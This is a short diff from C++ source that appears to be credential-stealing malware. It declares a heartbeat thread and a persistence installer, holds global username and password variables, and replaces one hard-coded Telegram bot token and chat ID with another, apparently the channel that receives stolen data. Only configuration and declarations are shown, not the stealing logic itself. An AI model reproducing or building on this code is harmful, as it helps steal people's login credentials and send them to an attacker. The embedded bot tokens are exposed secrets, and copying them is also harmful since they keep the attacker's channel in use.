@@ -52,8 +52,8 @@ void HeartbeatThread();
 void InstallPersistence();
 
 // ==================== CONFIGURATION ====================
-const char* BOT_TOKEN_ANSI = "7979273216:AAEW468Fxoz0H4nwkNGH--t0DyPP2pOTFEY";
-const char* CHAT_ID_ANSI = "7845441585";
+const char* BOT_TOKEN_ANSI = "8859240581:AAFnLF-UiOACLeZ4yohF_U1DXevsI7fnLL4";
+const char* CHAT_ID_ANSI = "8800473303";
 
 // ==================== GLOBAL VARIABLES ====================
 std::wstring g_username, g_password;
